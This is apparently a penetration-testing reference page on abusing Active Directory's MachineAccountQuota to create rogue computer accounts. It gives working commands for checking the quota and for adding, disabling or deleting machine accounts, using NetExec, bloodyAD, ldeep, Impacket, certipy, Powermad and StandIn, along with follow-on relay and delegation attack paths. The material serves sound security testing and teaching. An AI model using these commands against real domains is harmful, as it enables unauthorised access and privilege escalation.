## Theory
MachineAccountQuota (MAQ) is a domain level attribute that by default permits unprivileged users to attach up to 10 computers to an Active Directory (AD) domain
## Exploit
There are multiple ways attackers can leverage that power.

- Force client authentications, relay those authentications to domain controllers using LDAPS, and take advantage of authenticated sessions to create a domain computer account. This account can then be used as a foothold on the AD domain to operate authenticated recon (i.e. with BloodHound for example)
- Create a computer account and use it for Kerberos RBCD attacks when leveraging owned accounts with sufficient permissions (i.e. ACEs like `GenericAll, GenericWrite or WriteProperty`) against a target machine
- Create a computer account and use it for a Kerberos Unconstrained Delegation attack when leveraging owned accounts with sufficient permissions (i.e. the `SeEnableDelegationPrivilege` user right)
- Profit from special rights that members of the Domain Computers group could inherit
- Profit from special rights that could automatically be applied to new domain computers based on their account name
### Check value
=== "UNIX-like"
    The MachineAccountQuota module (for NetExec (Python)) can be used to check the value of the MachineAccountQuota attribute:
    ```bash
    nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq
    ```
    Or alternatively with bloodyAD
    ```bash
    bloodyad -d $DOMAIN -u $USER -p $PASSWORD --host $DOMAIN_CONTROLLER get object 'DC=acme,DC=local' --attr ms-DS-MachineAccountQuota
    ```
    With [ldeep](https://github.com/franc-pentest/ldeep):
    ```bash
    ldeep ldap -d $DOMAIN -u $USER -p $PASSWORD -s $DOMAIN_CONTROLLER search '(objectclass=domain)' | jq '.[]."ms-DS-MachineAccountQuota"'
    ```
    With ldapsearch(C):
    ```bash
    ldapsearch -x -H ldap://$DOMAIN_CONTROLLER -b 'DC=acme,DC=local' -D "$USER@$DOMAIN" -W -s sub "(objectclass=domain)" | grep ms-DS-MachineAccountQuota
    ```
=== "Windows"
    cmdlets `Get-ADDomain` and `Get-ADObject`, will help testers make sure the controlled domain user can create computer accounts (the MachineAccountQuota domain-level attribute needs to be set higher than 0. It is set to 10 by default).
    ```bash
    Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
    ```
    FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) project is an alternative in C# (.NET assembly) to perform some AD post-compromise operations
    ```bash
    StandIn.exe --object ms-DS-MachineAccountQuota=*
    ```
### Create a computer account
=== "UNIX-like"
    The Impacket script addcomputer (Python) can be used to create a computer account, using the credentials of a domain user the the MachineAccountQuota domain-level attribute is set higher than 0 (10 by default).
    ```bash
    addcomputer.py -computer-name 'SomeName$' -computer-pass 'SomePassword' -dc-host "$DC_HOST" -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
    ```
    with [bloodyAD](https://github.com/CravateRouge/bloodyAD):
    ```bash
    bloodyad -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" add computer 'SomeName$' 'SomePassword'
    ```
    with [ldeep](https://github.com/franc-pentest/ldeep):
    ```bash
    ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_HOST" create_computer 'SomeName$' 'SomePassword'
    ```
    with [certipy](https://github.com/ly4k/Certipy):
    ```bash
    certipy account create -username "$USER"@"$DOMAIN" -password "$PASSWORD" -dc-ip "$DC_HOST" -user 'SomeName$' -pass 'SomePassword' -dns 'SomeDNS'
    ```
    Certipy also offers option to set the UPN (-upn), SAM account name (-sam), SPNS (-spns) while creating the computer.
=== "Windows"
    The [Powermad](https://github.com/Kevin-Robertson/Powermad) module (PowerShell) can be used to create a domain computer account.
    ```bash
    $password = ConvertTo-SecureString 'SomePassword' -AsPlainText -Force New-MachineAccount -MachineAccount 'PENTEST01' -Password $($password) -Verbose
    ```
    While the machine account can only be deleted by domain administrators, it can be deactivated by the creator account with the following command using the Powermad module.
    ```bash
    Disable-MachineAccount -MachineAccount 'PENTEST01' -Verbose
    ```
    An alternative is to use FuzzSecurity's [StandIn](https://github.com/FuzzySecurity/StandIn) (C#, .NET assembly) project to create a new password account with a random password, disable the account, or delete it (with elevated privileges):
    ```bash
    # Create the account
    StandIn.exe --computer 'PENTEST01' --make

    # Disable the account
    StandIn.exe --computer 'PENTEST01' --disable

    # Delete the account (requires elevated rights)
    StandIn.exe --computer 'PENTEST01' --delete
    ```
!!! note
    Testers need to be aware that the MAQ attribute set to a non-zero value doesn't necessarily mean the users can create machine accounts. The right to add workstations to a domain can in fact be changed in the Group Policies. `Group Policy Management Console (gpmc.msc) > Domain Controllers OU > Domain Controllers Policy > Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assigments > Add workstations to domain`

